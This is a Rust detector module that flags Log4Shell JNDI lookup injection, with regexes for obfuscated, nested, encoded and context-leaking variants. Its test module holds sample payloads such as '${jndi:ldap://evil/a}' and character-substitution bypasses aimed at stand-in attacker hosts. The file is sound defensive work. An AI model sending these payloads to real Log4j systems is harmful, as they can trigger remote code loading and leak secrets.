//! Log4Shell Evaluator — JNDI Lookup Injection Detection

use crate::evaluators::{EvidenceOperation, L2Detection, L2Evaluator, ProofEvidence};
use crate::types::InvariantClass;
use regex::Regex;

pub struct Log4ShellEvaluator;

impl L2Evaluator for Log4ShellEvaluator {
    fn id(&self) -> &'static str { "log4shell" }
    fn prefix(&self) -> &'static str { "L2 Log4Shell" }

    #[inline]

    fn detect(&self, input: &str) -> Vec<L2Detection> {
        let mut dets = Vec::new();
        let decoded = crate::encoding::multi_layer_decode(input).fully_decoded;
        let all_forms = crate::encoding::multi_layer_decode(input).all_forms;

        // Standard JNDI lookup: ${jndi:ldap://...}
        static jndi: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)\$\{(?:j|%6a|%4a)(?:n|%6e|%4e)(?:d|%64|%44)(?:i|%69|%49)\s*:").unwrap());
        if let Some(m) = jndi.find(&decoded) {
            let mut confidence = 0.95;
            // Check for dangerous protocols
            static DANGEROUS_PROTO_RE: std::sync::LazyLock<Regex> =
                std::sync::LazyLock::new(|| Regex::new(r"(?i)(?:ldap|rmi|dns|iiop|corba|nds|nis)s?://").unwrap());
            if DANGEROUS_PROTO_RE.is_match(&decoded) {
                confidence = 0.98;
            }

            dets.push(L2Detection {
                detection_type: "jndi_lookup".into(),
                confidence,
                detail: format!("JNDI lookup injection (Log4Shell): {}", &decoded[m.start()..decoded.len().min(m.start() + 80)]),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[m.start()..decoded.len().min(m.start() + 60)].to_owned(),
                    interpretation: "JNDI lookup triggers remote class loading for RCE".into(),
                    offset: m.start(),
                    property: "Log input must not contain JNDI lookup expressions".into(),
                }],
            });
        }

        // Obfuscated lookups: ${${lower:j}ndi:...} or ${${::-j}ndi:...}
        static obfuscated: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)\$\{[^}]*(?:\$\{[^}]*\}[^}]*)*(?:j|J)(?:n|N)(?:d|D)(?:i|I)\s*:").unwrap());
        if let Some(m) = obfuscated.find(&decoded) {
            if dets.is_empty() { // Don't duplicate
                dets.push(L2Detection {
                    detection_type: "jndi_obfuscated".into(),
                    confidence: 0.95,
                    detail: format!("Obfuscated JNDI lookup: {}", &decoded[m.start()..decoded.len().min(m.start() + 80)]),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: decoded[m.start()..decoded.len().min(m.start() + 60)].to_owned(),
                        interpretation: "Nested lookup syntax obfuscates JNDI injection".into(),
                        offset: m.start(),
                        property: "Log input must not contain JNDI lookup expressions".into(),
                    }],
                });
            }
        }

        // Log4j context lookups used for info leak: ${env:AWS_SECRET_ACCESS_KEY}
        static ctx_lookup: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)\$\{(?:env|sys|java|ctx|main|log4j|bundle|map|sd)\s*:").unwrap());
        if let Some(m) = ctx_lookup.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "log4j_context_leak".into(),
                confidence: 0.85,
                detail: format!("Log4j context lookup: {}", &decoded[m.start()..decoded.len().min(m.start() + 60)]),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[m.start()..decoded.len().min(m.start() + 40)].to_owned(),
                    interpretation: "Context lookup leaks environment variables or system properties".into(),
                    offset: m.start(),
                    property: "Log input must not contain Log4j lookup expressions".into(),
                }],
            });
        }

        // Nested lookup chain: ${upper:${lower:${jndi:...}}}
        static nested_lookup: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)\$\{(?:upper|lower)\s*:\s*\$\{(?:upper|lower)\s*:\s*\$\{\s*jndi\s*:").unwrap());
        if let Some(m) = nested_lookup.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "jndi_nested_lookup".into(),
                confidence: 0.97,
                detail: format!("Nested Log4j lookup chain leading to JNDI: {}", &decoded[m.start()..decoded.len().min(m.start() + 90)]),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: decoded[m.start()..decoded.len().min(m.start() + 70)].to_owned(),
                    interpretation: "Multi-level lookup composition reconstructs JNDI token at runtime".into(),
                    offset: m.start(),
                    property: "Log input must not contain nested lookup chains that resolve to JNDI".into(),
                }],
            });
        }

        // Log4j2 format string abuse where conversion pattern is combined with JNDI lookup payload
        static format_jndi: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?is)%[dDmM]\{[^}]*\}.*\$\{[^}]*jndi\s*:").unwrap());
        if let Some(m) = format_jndi.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "log4j_format_jndi".into(),
                confidence: 0.91,
                detail: format!("Log4j pattern formatter chained with JNDI lookup: {}", &decoded[m.start()..decoded.len().min(m.start() + 90)]),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[m.start()..decoded.len().min(m.start() + 70)].to_owned(),
                    interpretation: "Pattern-layout segment carries attacker-controlled lookup expression".into(),
                    offset: m.start(),
                    property: "Pattern-formatted log input must not embed JNDI lookups".into(),
                }],
            });
        }

        // ThreadContext/MDC key dereference combined with injected key material
        static ctx_key_lookup: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)\$\{ctx:[^}]+\}").unwrap());
        if let Some(m) = ctx_key_lookup.find(&decoded) {
            static POISONED_CTX_RE: std::sync::LazyLock<Regex> =
                std::sync::LazyLock::new(|| Regex::new(r"(?i)(?:jndi|ldap|rmi|dns)://|\$\{[^}]*jndi\s*:").unwrap());
            let poisoned = POISONED_CTX_RE.is_match(&decoded);
            if poisoned {
                dets.push(L2Detection {
                    detection_type: "thread_context_poisoning".into(),
                    confidence: 0.90,
                    detail: format!("ThreadContext/MDC lookup with injected key value: {}", m.as_str()),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::TypeCoerce,
                        matched_input: m.as_str().to_owned(),
                        interpretation: "Attacker-poisoned MDC key is dereferenced into lookup-capable context".into(),
                        offset: m.start(),
                        property: "MDC/ThreadContext keys must not carry lookup payloads".into(),
                    }],
                });
            }
        }

        // DNS callback probes for blind Log4Shell detection
        static dns_callback: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)\$\{\s*jndi\s*:\s*dns://[a-z0-9._:-]+").unwrap());
        if let Some(m) = dns_callback.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "jndi_dns_callback".into(),
                confidence: 0.99,
                detail: format!("JNDI DNS callback payload: {}", m.as_str()),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "DNS JNDI endpoint is commonly used as blind canary callback".into(),
                    offset: m.start(),
                    property: "Log input must not trigger external DNS/JNDI lookups".into(),
                }],
            });
        }

        // Log4j message and MDC lookups
        static msg_mdc_lookup: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)\$\{(?:msg|mdc)\s*:[^}]+\}").unwrap());
        if let Some(m) = msg_mdc_lookup.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "log4j_message_lookup".into(),
                confidence: 0.84,
                detail: format!("Log4j message/MDC lookup expression: {}", m.as_str()),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Message/MDC lookup reads attacker-controlled fields into logging context".into(),
                    offset: m.start(),
                    property: "Log input must not include message or MDC lookup expressions".into(),
                }],
            });
        }

        // Recursive substitution bypass: ${${::-j}${::-n}d${::-i}} and variants
        static recursive_bypass: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)\$\{[^}]*\$\{::-[a-z]\}[^}]*\$\{::-[a-z]\}[^}]*\$\{::-[a-z]\}[^}]*\}").unwrap());
        if let Some(m) = recursive_bypass.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "jndi_recursive_bypass".into(),
                confidence: 0.97,
                detail: format!("Recursive substitution lookup bypass: {}", m.as_str()),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Character-by-character substitution reconstructs blocked JNDI token".into(),
                    offset: m.start(),
                    property: "Lookup parser must reject recursive substitution payloads".into(),
                }],
            });
        }

        // Obfuscated lookup segment assembly: ${lower:j}ndi and ${::-j}ndi
        static OBF_SEGMENT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(
                r#"(?is)\$\{\s*(?:lower|upper)\s*:\s*[jnid]\s*\}\s*(?:\$\{\s*(?:lower|upper)\s*:\s*[jnid]\s*\}\s*){1,3}\s*:|\$\{\s*::-[jnid]\s*\}\s*(?:\$\{\s*::-[jnid]\s*\}\s*){1,3}\s*:"#,
            )
            .unwrap()
        });
        if let Some(m) = OBF_SEGMENT_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "jndi_obfuscated_segments".into(),
                confidence: 0.97,
                detail: format!("Segment-wise JNDI obfuscation using transform/default lookups: {}", m.as_str()),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Character fragments are reconstructed at runtime to bypass token filters".into(),
                    offset: m.start(),
                    property: "Lookup parser must reject fragment-composed JNDI names".into(),
                }],
            });
        }

        // Nested variable resolution to reconstruct "jndi": ${${env:NaN:-j}ndi:...}
        static NESTED_VAR_RESOLVE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(
                r#"(?is)\$\{\s*\$\{\s*(?:env|sys|ctx|main|map)\s*:[^}:]+:-[jnid]\s*\}\s*[jnid]{2,6}\s*:\s*(?:ldap|ldaps|rmi|dns|iiop|corba)://"#,
            )
            .unwrap()
        });
        if let Some(m) = NESTED_VAR_RESOLVE_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "jndi_nested_variable_resolution".into(),
                confidence: 0.98,
                detail: format!("Nested variable fallback reconstructs JNDI token: {}", m.as_str()),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SemanticEval,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Nested fallback expression resolves hidden JNDI identifier at evaluation time".into(),
                    offset: m.start(),
                    property: "Log4j variable fallback expressions must not resolve into JNDI lookups".into(),
                }],
            });
        }

        // Alternate JNDI protocols (rmi://, iiop://, corba://) with direct or obfuscated jndi prefix.
        static ALT_PROTO_JNDI_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\$\{[^}]{0,120}jndi\s*:\s*(?:rmi|iiop|corba)://").unwrap()
        });
        if let Some(m) = ALT_PROTO_JNDI_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "jndi_alternate_protocol".into(),
                confidence: 0.98,
                detail: format!("JNDI lookup uses alternate remote protocol: {}", m.as_str()),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Non-LDAP JNDI protocol still triggers remote naming/service resolution".into(),
                    offset: m.start(),
                    property: "All remote JNDI protocols must be blocked in log-resolved input".into(),
                }],
            });
        }

        // Log4j2 ThreadContext and MDC poisoning APIs carrying lookup payload.
        static THREADCONTEXT_PUT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(
                r#"(?is)\bThreadContext\.(?:put|putAll|push)\s*\([^)]*(?:\$\{[^}]*jndi\s*:|(?:ldap|rmi|dns|iiop|corba)://)[^)]*\)"#,
            )
            .unwrap()
        });
        if let Some(m) = THREADCONTEXT_PUT_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "log4j2_threadcontext_injection".into(),
                confidence: 0.94,
                detail: format!("ThreadContext API injects lookup-capable payload: {}", m.as_str()),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::TypeCoerce,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "ThreadContext key/value store is populated with payload that can be expanded in logs".into(),
                    offset: m.start(),
                    property: "ThreadContext values must be sanitized and treated as untrusted log input".into(),
                }],
            });
        }

        static MDC_API_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(
                r#"(?is)\bMDC\.(?:put|putCloseable|setContextMap)\s*\([^)]*(?:\$\{[^}]*jndi\s*:|(?:ldap|rmi|dns|iiop|corba)://)[^)]*\)"#,
            )
            .unwrap()
        });
        if let Some(m) = MDC_API_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "log4j_mdc_injection".into(),
                confidence: 0.94,
                detail: format!("MDC API injects lookup-capable payload: {}", m.as_str()),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::TypeCoerce,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Mapped Diagnostic Context is poisoned with expansion payload".into(),
                    offset: m.start(),
                    property: "MDC values must be sanitized before being rendered by layout lookups".into(),
                }],
            });
        }

        // URL-encoded and double-encoded JNDI payload carriers.
        static SINGLE_ENC_JNDI_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)%24%7b(?:jndi|%6a%6e%64%69)%3a(?:ldap|rmi|dns|iiop|corba)%3a%2f%2f").unwrap()
        });
        static DOUBLE_ENC_JNDI_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)%2524%257b(?:jndi|%256a%256e%2564%2569)%253a(?:ldap|rmi|dns|iiop|corba)%253a%252f%252f").unwrap()
        });
        if let Some(encoded_form) = all_forms
            .iter()
            .find(|f| SINGLE_ENC_JNDI_RE.is_match(f) || DOUBLE_ENC_JNDI_RE.is_match(f))
        {
            dets.push(L2Detection {
                detection_type: "jndi_encoded_payload".into(),
                confidence: if DOUBLE_ENC_JNDI_RE.is_match(encoded_form) {
                    0.97
                } else {
                    0.93
                },
                detail: "Encoded JNDI payload survives one or more decode stages".into(),
                position: 0,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::EncodingDecode,
                    matched_input: encoded_form.to_owned(),
                    interpretation: "Percent-encoding hides lookup syntax until decode pipeline reconstructs payload".into(),
                    offset: 0,
                    property: "Decoding and security validation must run in the same canonicalization stage".into(),
                }],
            });
        }

        dets
    }

    fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
        match detection_type {
            "jndi_lookup" | "jndi_obfuscated" | "log4j_context_leak"
                => Some(InvariantClass::LogJndiLookup),
            "jndi_nested_lookup" | "log4j_format_jndi" | "thread_context_poisoning"
            | "jndi_dns_callback" | "log4j_message_lookup" | "jndi_recursive_bypass"
            | "jndi_obfuscated_segments" | "jndi_nested_variable_resolution" | "jndi_alternate_protocol"
            | "log4j2_threadcontext_injection" | "log4j_mdc_injection" | "jndi_encoded_payload"
                => Some(InvariantClass::LogJndiLookup),
            _ => None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_nested_lookup_chain() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("${upper:${lower:${jndi:ldap://example.com/a}}}");
        assert!(dets.iter().any(|d| d.detection_type == "jndi_nested_lookup"));
    }

    #[test]
    fn detects_format_string_abuse_with_jndi() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("%d{HH:mm:ss} ${jndi:ldap://evil/a}");
        assert!(dets.iter().any(|d| d.detection_type == "log4j_format_jndi"));
    }

    #[test]
    fn detects_thread_context_poisoning() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("user=${ctx:loginId} value=${jndi:ldap://poison/a}");
        assert!(dets.iter().any(|d| d.detection_type == "thread_context_poisoning"));
    }

    #[test]
    fn detects_dns_callback_probe() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("${jndi:dns://canary.example.com/a}");
        assert!(dets.iter().any(|d| d.detection_type == "jndi_dns_callback"));
    }

    #[test]
    fn detects_message_and_mdc_lookup() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("prefix ${msg:username} and ${mdc:traceId}");
        assert!(dets.iter().any(|d| d.detection_type == "log4j_message_lookup"));
    }

    #[test]
    fn detects_recursive_substitution_bypass() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("${${::-j}${::-n}d${::-i}:ldap://attacker/a}");
        assert!(dets.iter().any(|d| d.detection_type == "jndi_recursive_bypass"));
    }

    #[test]
    fn detects_obfuscated_lower_segment_lookup() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil/a}");
        assert!(dets.iter().any(|d| d.detection_type == "jndi_obfuscated_segments"));
    }

    #[test]
    fn detects_obfuscated_default_segment_lookup() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("${${::-j}${::-n}${::-d}${::-i}:ldap://evil/a}");
        assert!(dets.iter().any(|d| d.detection_type == "jndi_obfuscated_segments"));
    }

    #[test]
    fn detects_nested_variable_resolution_jndi() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("${${env:NaN:-j}ndi:rmi://attacker/a}");
        assert!(dets.iter().any(|d| d.detection_type == "jndi_nested_variable_resolution"));
    }

    #[test]
    fn detects_alternate_protocol_rmi_lookup() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("${jndi:rmi://evil-server/a}");
        assert!(dets.iter().any(|d| d.detection_type == "jndi_alternate_protocol"));
    }

    #[test]
    fn detects_alternate_protocol_iiop_lookup() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("${jndi:iiop://evil-server/a}");
        assert!(dets.iter().any(|d| d.detection_type == "jndi_alternate_protocol"));
    }

    #[test]
    fn detects_log4j2_threadcontext_api_injection() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("ThreadContext.put(\"login\", \"${jndi:ldap://evil/a}\")");
        assert!(dets.iter().any(|d| d.detection_type == "log4j2_threadcontext_injection"));
    }

    #[test]
    fn detects_mdc_api_injection() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("MDC.put(\"trace\", \"${jndi:ldap://evil/a}\")");
        assert!(dets.iter().any(|d| d.detection_type == "log4j_mdc_injection"));
    }

    #[test]
    fn detects_url_encoded_jndi_payload() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D");
        assert!(dets.iter().any(|d| d.detection_type == "jndi_encoded_payload"));
    }

    #[test]
    fn detects_double_url_encoded_jndi_payload() {
        let eval = Log4ShellEvaluator;
        let dets = eval.detect("%2524%257Bjndi%253Aldap%253A%252F%252Fevil.example%252Fa%257D");
        assert!(dets.iter().any(|d| d.detection_type == "jndi_encoded_payload"));
    }
}
